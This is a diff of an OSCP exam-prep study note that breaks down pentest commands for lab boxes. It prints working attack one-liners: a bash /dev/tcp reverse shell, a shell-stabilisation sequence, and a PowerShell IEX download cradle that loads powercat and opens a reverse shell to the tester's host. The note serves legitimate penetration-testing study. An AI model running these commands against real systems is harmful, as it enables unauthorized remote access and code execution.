@@ -30,11 +30,11 @@ Part of [[COMMAND BREAKDOWNS]]. Reverse shell delivery mechanics, encoding requi
 
 **Full command:**
 ```bash
-bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
+bash -c "bash -i >& /dev/tcp/$LocalIP/4444 0>&1"
 ```
 
 **Piece by piece:**
-- `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1` on its own → this is the actual reverse shell. `/dev/tcp/<ip>/<port>` is a special pseudo-device **only `bash` itself understands** (it's a bash builtin feature, not a real file), opening it creates a TCP socket. `>&` redirects both stdout and stderr into that socket, `0>&1` redirects stdin to follow the same fd, together turning the socket into a two-way interactive channel for `bash -i` (interactive bash).
+- `bash -i >& /dev/tcp/$LocalIP/4444 0>&1` on its own → this is the actual reverse shell. `/dev/tcp/$BoxIP/$Port` is a special pseudo-device **only `bash` itself understands** (it's a bash builtin feature, not a real file), opening it creates a TCP socket. `>&` redirects both stdout and stderr into that socket, `0>&1` redirects stdin to follow the same fd, together turning the socket into a two-way interactive channel for `bash -i` (interactive bash).
 - The outer `bash -c "..."` → this is the non-obvious part, and it exists for a reason that has nothing to do with the reverse shell syntax itself. PHP's `system()` (and similar exec functions) commonly invoke the OS command through `/bin/sh`, not `/bin/bash`, and on most Linux distros `sh` is a symlink to `dash`, a leaner shell that **doesn't implement `/dev/tcp`** at all. Send the raw one-liner without the wrapper and `sh` throws a syntax/file-not-found error, the payload never runs, even though the syntax is perfectly valid bash. Wrapping it in `bash -c "..."` forces a real `bash` process to interpret the inner string regardless of what shell is running the outer command.
 
 **Where this comes from:** this `sh`-vs-`bash` distinction is a general Linux fact (not exploit-specific), documented in bash's own manual under "REDIRECTION" for the `/dev/tcp` feature, and repeatedly called out on PayloadsAllTheThings' and HackTricks' reverse shell cheat sheets as a common reason a "correct-looking" reverse shell one-liner silently fails to fire.
@@ -44,6 +44,32 @@ bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
 🔁 **Seen in:** [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|Common Web Application Attacks, 9.2.1]], Step 6.
 
 #### Tags: #ReverseShell #BashReverseShell #BashCWrapper #CommandBreakdowns
+
+---
+
+## `stty raw -echo; fg`: recovering a usable foreground shell
+
+**Full sequence:**
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Press Ctrl+Z
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm
+```
+
+**Piece by piece:**
+- `python3 -c 'import pty;pty.spawn("/bin/bash")'` creates a pseudo-terminal, which gives the callback a terminal-like device instead of a pipe.
+- `Ctrl+Z` suspends the foreground callback so commands can be entered in the local terminal.
+- `stty raw` disables local line processing, allowing keystrokes to pass directly to the remote terminal. `-echo` prevents the local terminal from printing each key twice.
+- `fg` brings the suspended callback back to the foreground. Pressing Enter twice completes the pending line after foregrounding and returns the remote prompt.
+- `export TERM=xterm` tells terminal-aware programs which capabilities to use.
+
+If the display becomes unreadable, run `reset` locally and repeat the foregrounding sequence. The result should be checked with `id` before local enumeration.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|HTB Nibbles]].
+
+#### Tags: #ShellStabilise #PTY #stty #CommandBreakdowns
 
 ---
 
@@ -96,13 +122,13 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 **Full command (the download-and-execute half):**
 ```powershell
-IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://$LocalIP/powercat.ps1');powercat -c $LocalIP -p 4444 -e powershell
 ```
 
 **Piece by piece:**
-- `(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1')` → fetches the PowerCat script's raw text over HTTP, as a string, entirely in memory. Nothing touches disk, no file gets written to the target that AV could scan at rest.
+- `(New-Object System.Net.WebClient).DownloadString('http://$LocalIP/powercat.ps1')` → fetches the PowerCat script's raw text over HTTP, as a string, entirely in memory. Nothing touches disk, no file gets written to the target that AV could scan at rest.
 - `IEX(...)` → short for `Invoke-Expression`, takes that fetched string and executes it as PowerShell code immediately, in the current session. This two-step "download the text, then `IEX` it" pattern is the standard PowerShell **download cradle**, it's what turns a plain HTTP GET into code actually running on the target. Once this runs, every function PowerCat defines (including the `powercat` command itself) becomes available in the current session.
-- `powercat -c <kali_ip> -p 4444 -e powershell` → now that PowerCat's own function is loaded, this line calls it: `-c` (client mode, connect out to the listener) `-p` (port) `-e powershell` (execute `powershell.exe` and pipe its input/output through the connection, PowerCat's equivalent of netcat's `-e`). This is what actually produces the interactive reverse shell, the `IEX` line above only loaded the tool, it didn't call it yet.
+- `powercat -c $LocalIP -p 4444 -e powershell` → now that PowerCat's own function is loaded, this line calls it: `-c` (client mode, connect out to the listener) `-p` (port) `-e powershell` (execute `powershell.exe` and pipe its input/output through the connection, PowerCat's equivalent of netcat's `-e`). This is what actually produces the interactive reverse shell, the `IEX` line above only loaded the tool, it didn't call it yet.
 - Why PowerCat over a hand-rolled PowerShell reverse-shell one-liner: PowerCat is a maintained, well-tested implementation that handles the socket/stream plumbing correctly, versus hand-writing raw `.NET` socket code (like the `TCPClient`/`NetworkStream` version used elsewhere) every time. Trade-off: it requires two network round trips (fetch the script, then the actual shell callback) instead of one self-contained payload, and it depends on the target being able to reach your web server, not just your listener.
 
 **Why the same payload needs chunking when delivered via a VBA macro, but not via a URL parameter:**
@@ -162,3 +188,14 @@ The traditional `-e` flag (`nc -e /bin/bash -lvp 4444`) spawns a process with nc
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
